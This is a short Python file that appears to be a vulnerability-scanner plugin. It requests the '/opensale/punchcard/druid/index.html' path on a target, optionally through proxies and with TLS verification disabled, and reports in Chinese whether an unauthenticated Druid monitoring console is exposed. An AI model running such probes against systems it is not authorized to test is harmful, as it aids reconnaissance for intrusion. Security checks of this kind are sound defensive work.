import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201aa(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        logging.captureWarnings(True)
        gf = requests.get(url+'/opensale/punchcard/druid/index.html',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf.encoding = 'utf-8'
        jx = BeautifulSoup(gf.text, 'html.parser')
        if 'JavaVMName' in jx.text or 'JavaClassPath' in jx.text:
            uia = '[+]漏洞存在,\n/opensale/punchcard/druid/index.html'
        else:
            uia = '[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1aa():
    global uia
    return '--------------------------------------------------\n[ Druid未授权访问 ]\n\n'+ str (uia)+'\n'
def yt1aaa(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)